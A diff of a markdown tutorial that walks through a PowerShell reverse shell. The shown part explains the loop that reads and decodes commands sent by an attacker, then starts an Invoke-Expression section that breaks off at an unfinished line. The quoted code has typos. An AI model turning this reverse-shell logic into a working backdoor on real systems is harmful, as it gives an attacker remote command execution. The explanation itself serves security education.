@@ -57,4 +57,9 @@ while (($i = stream.Read($bytes,0,$bytes,Length)) -ne 0)
 {; data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)}
 ```
 - Converts bytes from attacker into readable text and stores the result in `$data`
-- When an attacker sends `whoami` the stream receives the ASCII bytes `119 104 111 97 109 105` abd the `GetString` objects 
+- When an attacker sends `whoami` the stream receives the ASCII bytes `119 104 111 97 109 105` abd the `GetString` objects coverts it to `$data = "whoami"`
+
+### Invoke-Expression
+```powershell
+$sendback =
+```
